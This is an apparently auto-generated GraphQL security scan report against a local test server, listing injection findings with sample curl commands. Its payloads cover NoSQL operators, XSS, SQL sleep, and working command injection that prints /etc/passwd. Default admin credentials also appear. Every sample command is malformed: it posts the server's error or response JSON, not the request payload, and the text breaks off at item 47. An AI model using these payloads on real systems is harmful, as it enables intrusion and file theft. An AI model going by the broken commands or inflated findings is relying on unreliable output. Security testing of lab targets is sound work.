# GrapeQL Security Report

Date: 2025-04-15 22:57:17

## Table of Contents

1. [Endpoint: http://127.0.0.1:5013/graphql](#endpoint-1)

<a name='endpoint-1'></a>
## 1. Endpoint: http://127.0.0.1:5013/graphql

### Server Information

- Implementation: **Graphene**
- Technology Stack: Python
- Reference URL: https://graphene-python.org/

### Response Time Statistics

- Requests: 670
- Minimum: 0.0029 seconds
- Maximum: 2.1836 seconds
- Average: 0.0097 seconds

### High Severity Vulnerabilities

#### 1.1.1. Injection Vulnerability

**Description**: Server is vulnerable to injection attacks

**Details**: Found 95 potential injection points across 30 tested fields

**Sample curl commands**:

1. For field `pastes.limit` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 116' -d '{"errors":[{"message":"Syntax Error GraphQL (3:35) Unexpected Name \"null\"\n\n2:                 query {\n3:                     pastes(limit: null)\n                                     ^\n4:                 }\n","locations":[{"line":3,"column":35}]}]}' http://127.0.0.1:5013/graphql
```

2. For field `pastes.filter` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 132' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Expected Name, found $\n\n2:                 query {\n3:                     pastes(filter: \"{\"$gt\": \"\"}\")\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

3. For field `pastes.filter` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 132' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Expected Name, found $\n\n2:                 query {\n3:                     pastes(filter: \"{\"$ne\": null}\")\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

4. For field `pastes.filter` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 133' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Unexpected character \";\".\n\n2:                 query {\n3:                     pastes(filter: \"\"); alert(\"XSS\")\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

5. For field `pastes.filter` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 131' -d '{"errors":[{"message":"Syntax Error GraphQL (3:44) Expected :, found (\n\n2:                 query {\n3:                     pastes(filter: \"\" SLEEP(5) --\")\n                                              ^\n4:                 }\n","locations":[{"line":3,"column":44}]}]}' http://127.0.0.1:5013/graphql
```

6. For field `paste.id` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 112' -d '{"errors":[{"message":"Syntax Error GraphQL (3:31) Unexpected Name \"null\"\n\n2:                 query {\n3:                     paste(id: null)\n                                 ^\n4:                 }\n","locations":[{"line":3,"column":31}]}]}' http://127.0.0.1:5013/graphql
```

7. For field `paste.title` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 130' -d '{"errors":[{"message":"Syntax Error GraphQL (3:37) Expected Name, found $\n\n2:                 query {\n3:                     paste(title: \"{\"$gt\": \"\"}\")\n                                       ^\n4:                 }\n","locations":[{"line":3,"column":37}]}]}' http://127.0.0.1:5013/graphql
```

8. For field `paste.title` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 130' -d '{"errors":[{"message":"Syntax Error GraphQL (3:37) Expected Name, found $\n\n2:                 query {\n3:                     paste(title: \"{\"$ne\": null}\")\n                                       ^\n4:                 }\n","locations":[{"line":3,"column":37}]}]}' http://127.0.0.1:5013/graphql
```

9. For field `paste.title` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 131' -d '{"errors":[{"message":"Syntax Error GraphQL (3:37) Unexpected character \";\".\n\n2:                 query {\n3:                     paste(title: \"\"); alert(\"XSS\")\n                                       ^\n4:                 }\n","locations":[{"line":3,"column":37}]}]}' http://127.0.0.1:5013/graphql
```

10. For field `paste.title` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 129' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Expected :, found (\n\n2:                 query {\n3:                     paste(title: \"\" SLEEP(5) --\")\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

11. For field `systemDiagnostics.username` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 190' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Expected Name, found $\n\n2:                 query {\n3:                     systemDiagnostics(username: \"{\"$gt\": \"\"}\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

12. For field `systemDiagnostics.username` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 190' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Expected Name, found $\n\n2:                 query {\n3:                     systemDiagnostics(username: \"{\"$ne\": null}\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

13. For field `systemDiagnostics.username` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 191' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Unexpected character \";\".\n\n2:                 query {\n3:                     systemDiagnostics(username: \"\"); alert(\"XSS\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

14. For field `systemDiagnostics.username` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 189' -d '{"errors":[{"message":"Syntax Error GraphQL (3:57) Expected :, found (\n\n2:                 query {\n3:                     systemDiagnostics(username: \"\" SLEEP(5) --\", username: \"admin\", password: \"changeme\")\n                                                           ^\n4:                 }\n","locations":[{"line":3,"column":57}]}]}' http://127.0.0.1:5013/graphql
```

15. For field `systemDiagnostics.password` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 190' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Expected Name, found $\n\n2:                 query {\n3:                     systemDiagnostics(password: \"{\"$gt\": \"\"}\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

16. For field `systemDiagnostics.password` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 190' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Expected Name, found $\n\n2:                 query {\n3:                     systemDiagnostics(password: \"{\"$ne\": null}\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

17. For field `systemDiagnostics.password` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 191' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Unexpected character \";\".\n\n2:                 query {\n3:                     systemDiagnostics(password: \"\"); alert(\"XSS\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

18. For field `systemDiagnostics.password` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 189' -d '{"errors":[{"message":"Syntax Error GraphQL (3:57) Expected :, found (\n\n2:                 query {\n3:                     systemDiagnostics(password: \"\" SLEEP(5) --\", username: \"admin\", password: \"changeme\")\n                                                           ^\n4:                 }\n","locations":[{"line":3,"column":57}]}]}' http://127.0.0.1:5013/graphql
```

19. For field `systemDiagnostics.cmd` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 185' -d '{"errors":[{"message":"Syntax Error GraphQL (3:47) Expected Name, found $\n\n2:                 query {\n3:                     systemDiagnostics(cmd: \"{\"$gt\": \"\"}\", username: \"admin\", password: \"changeme\")\n                                                 ^\n4:                 }\n","locations":[{"line":3,"column":47}]}]}' http://127.0.0.1:5013/graphql
```

20. For field `systemDiagnostics.cmd` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 185' -d '{"errors":[{"message":"Syntax Error GraphQL (3:47) Expected Name, found $\n\n2:                 query {\n3:                     systemDiagnostics(cmd: \"{\"$ne\": null}\", username: \"admin\", password: \"changeme\")\n                                                 ^\n4:                 }\n","locations":[{"line":3,"column":47}]}]}' http://127.0.0.1:5013/graphql
```

21. For field `systemDiagnostics.cmd` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 186' -d '{"errors":[{"message":"Syntax Error GraphQL (3:47) Unexpected character \";\".\n\n2:                 query {\n3:                     systemDiagnostics(cmd: \"\"); alert(\"XSS\", username: \"admin\", password: \"changeme\")\n                                                 ^\n4:                 }\n","locations":[{"line":3,"column":47}]}]}' http://127.0.0.1:5013/graphql
```

22. For field `systemDiagnostics.cmd` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 184' -d '{"errors":[{"message":"Syntax Error GraphQL (3:52) Expected :, found (\n\n2:                 query {\n3:                     systemDiagnostics(cmd: \"\" SLEEP(5) --\", username: \"admin\", password: \"changeme\")\n                                                      ^\n4:                 }\n","locations":[{"line":3,"column":52}]}]}' http://127.0.0.1:5013/graphql
```

23. For field `systemDebug.arg` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Expected Name, found $\n\n2:                 query {\n3:                     systemDebug(arg: \"{\"$gt\": \"\"}\")\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

24. For field `systemDebug.arg` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Expected Name, found $\n\n2:                 query {\n3:                     systemDebug(arg: \"{\"$ne\": null}\")\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

25. For field `systemDebug.arg` with payload `"| cat /etc/passwd"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 136' -d '{"data":{"systemDebug":"root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\ndvga:x:1000:1000:Linux User,,,:/home/dvga:/bin/ash\n"}}' http://127.0.0.1:5013/graphql
```

26. For field `systemDebug.arg` with payload `"$(cat /etc/passwd)"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"data":{"systemDebug":"PID   USER     TIME  COMMAND\n    1 dvga      0:34 python app.py\n  244 dvga      0:00 ps root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin dvga:x:1000:1000:Linux User,,,:/home/dvga:/bin/ash\n"}}' http://127.0.0.1:5013/graphql
```

27. For field `systemDebug.arg` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 135' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Unexpected character \";\".\n\n2:                 query {\n3:                     systemDebug(arg: \"\"); alert(\"XSS\")\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

28. For field `systemDebug.arg` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 133' -d '{"errors":[{"message":"Syntax Error GraphQL (3:46) Expected :, found (\n\n2:                 query {\n3:                     systemDebug(arg: \"\" SLEEP(5) --\")\n                                                ^\n4:                 }\n","locations":[{"line":3,"column":46}]}]}' http://127.0.0.1:5013/graphql
```

29. For field `users.id` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 112' -d '{"errors":[{"message":"Syntax Error GraphQL (3:31) Unexpected Name \"null\"\n\n2:                 query {\n3:                     users(id: null)\n                                 ^\n4:                 }\n","locations":[{"line":3,"column":31}]}]}' http://127.0.0.1:5013/graphql
```

30. For field `readAndBurn.id` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 118' -d '{"errors":[{"message":"Syntax Error GraphQL (3:37) Unexpected Name \"null\"\n\n2:                 query {\n3:                     readAndBurn(id: null)\n                                       ^\n4:                 }\n","locations":[{"line":3,"column":37}]}]}' http://127.0.0.1:5013/graphql
```

31. For field `search.keyword` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 133' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found $\n\n2:                 query {\n3:                     search(keyword: \"{\"$gt\": \"\"}\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

32. For field `search.keyword` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 133' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found $\n\n2:                 query {\n3:                     search(keyword: \"{\"$ne\": null}\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

33. For field `search.keyword` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Unexpected character \";\".\n\n2:                 query {\n3:                     search(keyword: \"\"); alert(\"XSS\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

34. For field `search.keyword` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 132' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Expected :, found (\n\n2:                 query {\n3:                     search(keyword: \"\" SLEEP(5) --\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

35. For field `me.token` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 127' -d '{"errors":[{"message":"Syntax Error GraphQL (3:34) Expected Name, found $\n\n2:                 query {\n3:                     me(token: \"{\"$gt\": \"\"}\")\n                                    ^\n4:                 }\n","locations":[{"line":3,"column":34}]}]}' http://127.0.0.1:5013/graphql
```

36. For field `me.token` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 127' -d '{"errors":[{"message":"Syntax Error GraphQL (3:34) Expected Name, found $\n\n2:                 query {\n3:                     me(token: \"{\"$ne\": null}\")\n                                    ^\n4:                 }\n","locations":[{"line":3,"column":34}]}]}' http://127.0.0.1:5013/graphql
```

37. For field `me.token` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 128' -d '{"errors":[{"message":"Syntax Error GraphQL (3:34) Unexpected character \";\".\n\n2:                 query {\n3:                     me(token: \"\"); alert(\"XSS\")\n                                    ^\n4:                 }\n","locations":[{"line":3,"column":34}]}]}' http://127.0.0.1:5013/graphql
```

38. For field `me.token` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 126' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Expected :, found (\n\n2:                 query {\n3:                     me(token: \"\" SLEEP(5) --\")\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

39. For field `createPaste.content` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 141' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Expected Name, found $\n\n2:                 mutation {\n3:                     createPaste(content: \"{\"$gt\": \"\"}\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

40. For field `createPaste.content` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 141' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Expected Name, found $\n\n2:                 mutation {\n3:                     createPaste(content: \"{\"$ne\": null}\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

41. For field `createPaste.content` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 142' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Unexpected character \";\".\n\n2:                 mutation {\n3:                     createPaste(content: \"\"); alert(\"XSS\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

42. For field `createPaste.content` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 140' -d '{"errors":[{"message":"Syntax Error GraphQL (3:50) Expected :, found (\n\n2:                 mutation {\n3:                     createPaste(content: \"\" SLEEP(5) --\")\n                                                    ^\n4:                 }\n","locations":[{"line":3,"column":50}]}]}' http://127.0.0.1:5013/graphql
```

43. For field `createPaste.title` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found $\n\n2:                 mutation {\n3:                     createPaste(title: \"{\"$gt\": \"\"}\")\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

44. For field `createPaste.title` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found $\n\n2:                 mutation {\n3:                     createPaste(title: \"{\"$ne\": null}\")\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

45. For field `createPaste.title` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 140' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Unexpected character \";\".\n\n2:                 mutation {\n3:                     createPaste(title: \"\"); alert(\"XSS\")\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

46. For field `createPaste.title` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 138' -d '{"errors":[{"message":"Syntax Error GraphQL (3:48) Expected :, found (\n\n2:                 mutation {\n3:                     createPaste(title: \"\" SLEEP(5) --\")\n                                                  ^\n4:                 }\n","locations":[{"line":3,"column":48}]}]}' http://127.0.0.1:5013/graphql
```

47. For field `editPaste.content` with payload `"{"$gt": ""}"`:
```bash
